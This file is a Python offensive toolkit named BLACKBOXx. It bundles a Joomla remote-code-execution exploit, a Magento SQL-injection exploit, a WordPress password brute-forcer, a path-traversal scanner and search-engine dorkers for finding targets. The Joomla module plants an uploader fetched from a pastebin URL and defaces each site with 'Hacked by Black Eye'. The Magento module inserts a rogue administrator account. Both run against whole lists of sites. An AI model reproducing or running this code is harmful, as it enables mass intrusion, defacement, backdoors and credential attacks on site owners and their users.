#!/usr/bin/env python
#####################################NOTICE######################################
###     This program is free software: you can redistribute it and/or modify  ###
###     it under the terms of the GNU General Public License as published by  ###
###     the Free Software Foundation, either version 3 of the License, or     ###
###     (at your option) any later version.                                   ###
###     This program is distributed in the hope that it will be useful,       ###
###                                                                           ###
###     but WITHOUT ANY WARRANTY; without even the implied warranty of        ###
###     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         ###
###     GNU General Public License for more details.                          ###
###     You should have received a copy of the GNU General Public License     ###
###     along with this program.  If not, see <http://www.gnu.org/licenses/>  ###
#################################################################################
### JOOMLA RCE  : https://www.exploit-db.com/exploits/39033/
### MAGENTO RCE : https://www.exploit-db.com/exploits/37977/
import requests,json,sys, time, re, os, base64, random
from time import gmtime, strftime
from optparse import OptionParser
from urlparse import parse_qs, urlparse

__author__     = 'BLACK EYE'
__bitbucket__  = 'https://bitbucket.org/darkeye/'
__emailadd__   = 'blackdoor197@riseup.net'
__twitter__    = 'https://twitter.com/0x676'
__version__    = '0.7'
__license__    = 'GPLv2'
__scrname__    = 'BLACKBOXx v%s' % (__version__)

def __banner__():
	print color.BOLD+color.Y+" _____ __    _____ _____ _____ _____ _____ __ __"
	print color.BOLD+color.Y+"| __  |  |  |  _  |     |  |  | __  |     |  |  |_ _"
	print color.BOLD+color.Y+"| __ -|  |__|     |   --|    -| __ -|  |  |-   -|_'_|"
	print color.BOLD+color.Y+"|_____|_____|__|__|_____|__|__|_____|_____|__|__|_,_|"
	print color.W+color.BOLD+"\t\t\t\t\t\t     {"+color.C+__version__+"#Dev"+color.W+"}"+color.ENDC

def __help__():
	print color.W+color.BOLD+"Usage   : "+color.ENDC+sys.argv[0]+" {Module}"
	print color.BOLD+color.W+"Help    : "+color.ENDC+sys.argv[0]+" -h/--help"
	print color.W+color.BOLD+"Modules : "+color.ENDC
	print "\t\t+ Wordpress Bruteforce          :   wordpress_brute"
	#print "\t\t+ SSH Bruteforce                :   ssh_brute"
	#print "\t\t+ FTP Bruteforce                :   ftp_brute"
	print "\t\t+ Dnsinfo                       :   dns_info"
	print "\t\t+ Joomla Rce                    :   rce_joomla"
	print "\t\t+ Magento Rce                   :   rce_magento"
	print "\t\t+ Google Dorker                 :   google_dorker"
	print "\t\t+ Bing Dorker                   :   bing_dorker"
	print "\t\t+ update Database (sudo needed) :   -u/--update"

def __update__():
	pass

class color:
	P    =  '\033[95m' # purple
	B    =  '\033[94m' # Blue
	BOLD =  '\033[1m'  # Bold
	G    =  '\033[92m' # Green
	Y    =  '\033[93m' # Yellow
	R    =  '\033[91m' # Red
	W    =  '\033[97m' # White
	BL   =  '\033[90m' # Black
	M    =  '\033[95m' # Magenta
	C    =  '\033[96m' # Cyan
	ENDC =  '\033[0m'  # end colors


class checker:
	def lfi(self, url):
		LFI = []
		def lfi_link(url):
			payloads=[
			"../etc/passwd",
			"../etc/passwd%00",
			"../../etc/passwd",
			"../../etc/passwd%00",
			"../../../etc/passwd",
			"../../../etc/passwd%00",
			"../../../../etc/passwd",
			"../../../../etc/passwd%00",
			"../../../../../etc/passwd",
			"../../../../../etc/passwd%00",
			"../../../../../../etc/passwd",
			"../../../../../../etc/passwd%00",
			"../../../../../../../etc/passwd",
			"../../../../../../../etc/passwd%00",
			"../../../../../../../../etc/passwd",
			"../../../../../../../../etc/passwd%00",
			"../../../../../../../../../etc/passwd",
			"../../../../../../../../../etc/passwd%00",
			"../../../../../../../../../../etc/passwd",
			"../../../../../../../../../../etc/passwd%00",
			"../../../../../../../../../../../etc/passwd",
			"../../../../../../../../../../../etc/passwd%00",
			"../../../../../../../../../../../../etc/passwd",
			"../../../../../../../../../../../../etc/passwd%00",
			"..%2Fetc%2Fpasswd",
			"..%2Fetc%2Fpasswd%2500",
			"..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500"]
			lfi = re.findall(r'=(.*)', url)
			for i in lfi:
				l=re.sub(i, '', url)
				for payload in payloads:
					payload=payload.strip()
					lfi = l+payload
					LFI.append(lfi)
		lfi_link(url)
		for i in LFI:
			r = requests.get(i)
			if "root" in r.content:
				print color.W+color.BOLD+"LFI FOUND :"+color.Y+i
			else:
				continue
	def sqli(self, url):
		pass
####################################
##                                ##
##            DORKER              ##
##                                ##
####################################
class dorker:
	def google(self, dork, start, stop):
		urll = []
		def randomm():
			tld = [
			'ae', 'am', 'as', 'at',
			'az', 'ba', 'be', 'bg',
			'bi', 'bs', 'ca', 'cd',
			'cg', 'ch', 'ci', 'cl',
			'co.bw', 'co.ck', 'co.cr', 'co.hu',
			'co.id', 'co.il', 'co.im', 'co.in',
			'co.je', 'co.jp', 'co.ke', 'co.kr',
			'co.ls', 'co.ma', 'co.nz', 'co.th',
			'co.ug', 'co.uk', 'co.uz', 'co.ve',
			'co.vi', 'co.za', 'co.zm', 'com',
			'com.af', 'com.ag', 'com.ar', 'com.au',
			'com.bd', 'com.bo', 'com.br', 'com.bz',
			'com.co', 'com.cu', 'com.do', 'com.ec',
			'com.eg', 'com.et', 'com.fj', 'com.gi',
			'com.gt', 'com.hk', 'com.jm', 'com.kw',
			'com.ly', 'com.mt', 'com.mx', 'com.my',
			'com.na', 'com.nf', 'com.ni', 'com.np',
			'com.om', 'com.pa', 'com.pe', 'com.ph',
			'com.pk', 'com.pr', 'com.py', 'com.qa',
			'com.sa', 'com.sb', 'com.sg', 'com.sv',
			'com.tj', 'com.tr', 'com.tw', 'com.ua',
			'com.uy', 'com.uz', 'com.vc', 'com.vn',
			'cz', 'de', 'dj', 'dk',
			'dm', 'ee', 'es', 'fi',
			'fm', 'fr', 'gg', 'gl',
			'gm', 'gr', 'hn', 'hr',
			'ht', 'hu', 'ie', 'is',
			'it', 'jo', 'kg', 'kz',
			'li', 'lk', 'lt', 'lu',
			'lv', 'md', 'mn', 'ms',
			'mu', 'mw', 'net','nl',
			'no', 'nr', 'nu', 'pl',
			'pn', 'pt', 'ro', 'ru',
			'rw', 'sc', 'se', 'sh',
			'si', 'sk', 'sm', 'sn',
			'tm', 'to', 'tp', 'tt',
			'uz', 'vg', 'vu', 'ws']
			tld_rand = random.sample(tld, 1)
			for tldd in tld_rand:
				return tldd
		tld = randomm()
		def google_search():
			google = "https://www.google."+tld+"/search?q="+dork+"&start="+str(start)
			return google
		def get_url(url):
			headers = {'User-Agent'  : 'Googlebot/2.1b'}
			html = requests.get(url, headers=headers).content
			k = re.findall(r'<h3 class="r"><a href="(.*?)"', html)
			for s in k:
				s=s.strip()
				if s.startswith('/url?'):
					o = urlparse(s, 'http')
					link = parse_qs(o.query)['q'][0]
					urll.append(link)
					ope = open("url.txt", "a")
					ope.write(link+"\n")
					ope.close
		def search_url(start, stop):
			while start<stop:
				google_start = "https://www.google."+tld+"/search?q="+dork+"&start="+str(start)
				start+="10"
				get_url(google_start)
			print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(urll))+" FOUND"
		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" GOOLGE TLD    :  ."+tld
		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" SEARCH URL    :  "+google_search()
		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork+color.ENDC
		search_url(start, stop)
	def bing(self, ip,dork):
		bing ='http://www.bing.com/search?q=ip:'+ip+'+'+dork+'=&count=50000'
		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" SEARCH URL    :  "+bing
		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork
		get = requests.get(bing)
		html = get.content
		link = re.findall(r'<h2><a href="(.*?)"', html)
		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(link))+" FOUND"+color.ENDC
		for i in link:
			print i
			checker().lfi(i)


####################################
##                                ##
##   BruteForcing WP/JM/FTP/SSH   ##
##                                ##
####################################

class BruteForce:
	def wordpress(self, url, username,wordlist):
		headers = {
		'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0'
		}
		#ok = time.strftime("%H:%M:%S")
		time.ctime()
		ok = time.strftime('%H:%M:%S')
		datetime = '['+ok+']'

		url = "http://"+url+"/wp-login.php"
		if not requests.get(url).status_code == 200:
			print "Error with  : "+url+"\nResponse is : "+str(requests.get(url).status_code)
			return 1
		print color.G+datetime+color.ENDC+" Starting Attack ! "
		print color.G+datetime+color.W+" wordpress  : "+color.Y+url
		word = open(wordlist, 'r')
		word = word.readlines()
		for words in word:
			words = words.strip()
			
			payload = {'log' : username,
			           'pwd' : words}
			
			s = requests.post(url, data=payload, headers=headers)
			print color.R+"------------------------------------------------------------------"
			print color.G+datetime+color.W+" username   : "+color.Y+payload['log']
			print color.G+datetime+color.W+" password   : "+color.Y+payload['pwd']
			if "wp-admin" in s.url:
				print color.G+datetime+color.R+" Login Succes"+color.ENDC
				print color.R+"------------------------------------------------------------------"+color.ENDC				
				break
			elif "wp-login.php" in s.url:
				print color.G+datetime+color.C+" Login False"+color.ENDC
	def ftp_brute(self, url, wordlist):
		pass
	def ssh_brute(self, url, wordlist):
		pass
	def joomla(self, url, wordlist):
		pass


####################################
##                                ##
##    Add RCE joomla & Magento    ##
##                                ##
####################################

class rce:
	def joomla(self, wordlist):
		wordlist = open(wordlist, "r")
		def get_url(url, user_agent):
			headers = {
			'User-Agent': user_agent
			}
			cookies = requests.get(url,headers=headers).cookies
			for _ in range(3):
				response = requests.get(url, headers=headers,cookies=cookies)    
			return response.content
		def php_str_noquotes(data):
			encoded = ""
			for char in data:
				encoded += "chr({0}).".format(ord(char))
			return encoded[:-1]
		def generate_payload(php_payload):
			php_payload = "eval({0})".format(php_str_noquotes(php_payload))
			terminate = '\xf0\xfd\xfd\xfd';
			exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
			injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
			exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
			exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
			return exploit_template
		pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/up.php','w+'),file_get_contents('http://pastebin.com/raw/uWVsQH53')); fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/x.htm','w+'),'Hacked by Black Eye');")
		for i in wordlist.readlines():
			i=i.strip()
			get_url(i, pl)
			lala=requests.get(i+"/x.htm")
			if "Hacked" in lala.content:
				print i+"/x.htm  : Defaced | /up.php uploader file "
				z=open('Joomla_3.5_Shell.txt','a')
				z.write(i+"/x.htm\n")
				z.close()
			else:
				print i+" : Not Defaced"
		wordlist.close()


	def magento(self, wordlist):
		wordlist = open(wordlist, "r")
		for site in wordlist.readlines():
			site = site.strip()
			target_url = site + "/admin/Cms_Wysiwyg/directive/index/"
			if not target_url.startswith("http"):
				target_url = "http://" + target_url
			if target_url.endswith("/"):
				target_url = target_url[:-1]
			q="""
			SET @SALT = 'rp';
			SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
			SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
			INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
			INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');"""
			query = q.replace("\n", "").format(username="black", password="black")
			pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
			# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
			r = requests.post(target_url,
				data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
				"filter": base64.b64encode(pfilter),
				"forwarded": 1})
			if r.ok:
				print "{0}/admin with login : admin:admin".format(target_url)
			else:
				print "NOT WORKED with {0}".format(target_url)

####################################
##                                ##
##      Get Website from IP       ##
##                                ##
####################################

class dnsinfo:
	def yougetsignal(self, ip):
		def Details():
			yougetsignal = 'http://domains.yougetsignal.com/domains.php'
			data = {
			'remoteAddress': ip,
			'key'          : ''}
			headers={
			'User-Agent'  : 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
			get = requests.post(yougetsignal, data=data, headers=headers)
			get = get.text
			ok = json.loads(get)
			return ok
		
		def rzlt(details):
			print color.G+"Domains Hosted : "+color.W+color.BOLD+details['domainCount']+color.ENDC
			print color.G+"IP Address     : "+color.W+color.BOLD+details['remoteIpAddress']+color.ENDC
			print color.G+"Remote Address : "+color.W+color.BOLD+details['remoteAddress']+color.ENDC
			ipp = details['remoteIpAddress']
			rzt = open(ipp+".txt" ,'a')
			for domains,bl in details['domainArray']:
				rzt.write(domains+"\n")
			rzt.close
			print color.W+color.BOLD+"Domains is saved in "+ipp+".txt"+color.ENDC
		details = Details()
		rzlt(details)
	def viewdns(self):
		pass


def __main__():
	__banner__()
	for arg in sys.argv:
		if (arg=="--help" or arg=="-h"):
			__help__()
		if (arg=="wordpress_brute"):
			parser = OptionParser()
			parser.add_option("--url",
				help="URL OF Target")
			parser.add_option("--username","-u",
				help="Username of Wordpress")
			parser.add_option("--wordlist","-w",
				help="Wordlist for attack target")
			(options,args) = parser.parse_args()
			url = options.url
			username = options.username
			wordlist = options.wordlist
			if url and username and wordlist:
				BruteForce().wordpress(url, username, wordlist)
				break
			errors = []
			if (url == None):
				errors.append("[-] No URL specified.")
			if (username == None):
				errors.append("[-] No username specified.")
			if (wordlist == None):
				errors.append("[-] No Wordlist path specified.")
			if (len(errors) > 0):
				for error in errors:
					print color.BOLD+error+color.ENDC
		if (arg == "dns_info"):
			parser = OptionParser()
			parser.add_option("--ip",
				help="Parse IP address")
			parser.add_option("--yougetsignal","-y",
				help="Get website from yougetsignal",action="store_true")
			(options,args) = parser.parse_args()
			ip = options.ip
			yougetsignal = options.yougetsignal
			if ip and yougetsignal==True:
				dnsinfo().yougetsignal(ip)
		if (arg=="rce_joomla"):
			parser = OptionParser()
			parser.add_option("--wordlist","-w",
				help="wordlist path")
			(options,args) = parser.parse_args()
			wordlist = options.wordlist
			if wordlist:
				rce().joomla(wordlist)
		if (arg=="rce_magento"):
			parser = OptionParser()
			parser.add_option("--wordlist","-w",
				help="Wordlist path")
			(options,args) = parser.parse_args()
			wordlist = options.wordlist
			if wordlist:
				rce().magento(wordlist)
		if (arg=="google_dorker"):
			parser = OptionParser()
			parser.add_option("--dork","-d",
				help="Dork for get URL")
			parser.add_option("--start",default=0,
				help="Number of page for start")
			parser.add_option("--stop",
				help="Number of page to stop")
			(options,args) = parser.parse_args()
			dork = options.dork
			start = options.start
			stop = options.stop
			if dork and start and stop:
				dorker().google(dork, start, stop)
		if (arg=="bing_dorker"):
			parser = OptionParser()
			parser.add_option("--ip")
			parser.add_option("--dork","-d",
				help="Dork for get URL")
			(options,args) = parser.parse_args()
			ip = options.ip
			dork = options.dork
			if ip and dork:
				dorker().bing(ip,dork)

		if (arg=="-u" or arg=="--update"):
			__update__()
if __name__ == '__main__':
	try:
		__main__()
	except KeyboardInterrupt:
		print color.BOLD+color.Y+"Exiting Now !"+color.ENDC
		sys.exit(0)